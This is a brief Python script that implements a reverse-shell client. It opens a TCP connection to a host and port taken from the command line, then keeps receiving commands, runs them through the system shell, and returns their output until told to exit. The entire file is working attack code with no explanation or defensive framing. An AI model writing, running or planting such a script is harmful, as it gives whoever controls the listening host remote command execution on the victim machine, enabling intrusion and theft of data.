import socket, subprocess as sp,sys
import os

try :
    host = sys.argv[1]
except :
    host='localhost'
    
try: 
    port= int(sys.argv[2])
except:
    port=8080
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host,port))

while True:
    command = conn.recv(1024).decode("utf-8")
    if command != "exit":
        if command.startswith('cd') :
            try:
                os.chdir(command.split(' ')[1])
            except :
                pass
        else :
            sh = sp.Popen(command, shell=True,
                          stdout=sp.PIPE,
                          stderr=sp.PIPE,
                          stdin=sp.PIPE)
            out, err = sh.communicate()
            result = out.decode("iso-8859-1") + err.decode("iso-8859-1")
            conn.sendall(bytes(result,encoding='utf-8'))
    else :
        break
conn.close()
        
